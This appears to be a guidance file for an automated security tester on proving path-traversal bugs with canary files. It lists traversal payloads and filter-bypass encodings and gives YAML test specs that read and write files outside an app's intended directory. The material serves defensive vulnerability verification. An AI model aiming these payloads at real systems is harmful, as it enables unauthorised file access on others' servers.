# path-traversal: proving arbitrary file read

## What proves it
The response contains `${CANARY.file_content}`: a secret written to `${CANARY.file}` (an
absolute path outside the app's intended directory) before the app starts. The content is never
in the request, so it cannot be echoed by accident and cannot appear on fixed code.

## Payload
Try in this order:
1. The absolute path itself, `${CANARY.file}`: `os.path.join`, `path.join` and `Path(base) / x`
   discard the base when `x` is absolute.
2. Enough `../` to reach the root, then the absolute path: `../../../../../../../..${CANARY.file}`.
3. Encoded variants only if the code decodes after a check: `..%2F` in a path segment, or
   `....//` against a single non-recursive `replace("../", "")`.

```yaml
kind: http
hypothesis_id: H5
description: >
  GET /api/attachments?name= joins the name onto the upload dir without normalising it.
  A relative path reaching the filesystem root returns the sentinel file's secret content.
users:
  alice:
    vars: {username: alice, password: alice-dev-pw}
    login:
      - name: alice_login
        method: POST
        path: /api/login
        json: {username: "${USER.username}", password: "${USER.password}"}
        expect_status: [200]
steps:
  - name: read_sentinel
    as: alice
    path: /api/attachments
    query:
      name: ../../../../../../../..${CANARY.file}
oracles:
  - type: response_contains
    step: read_sentinel
    value: ${CANARY.file_content}
```

## Write variants (upload, archive extraction)
Write a file whose name traverses to a path outside the upload dir, with `${CANARY.token}` as
content and in the name, then prove it with a `command` oracle:

```yaml
kind: http
hypothesis_id: H6
description: >
  The upload handler uses the client filename unchanged; a traversing name writes outside
  the uploads directory.
users: {}
steps:
  - name: upload
    method: POST
    path: /api/upload
    form: {filename: "../../../../../../../../tmp/prsec-${CANARY.token}.txt", content: "${CANARY.token}"}
oracles:
  - type: command
    run: cat /tmp/prsec-${CANARY.token}.txt
    expect: ${CANARY.token}
```

## Pitfalls
- Never read real system files: the sentinel is the only target.
- Path in the URL path (`/files/<name>`): routers often normalise `../` before the handler; use
  the query or body parameter the code reads, or `%2F` only if the framework passes it through.
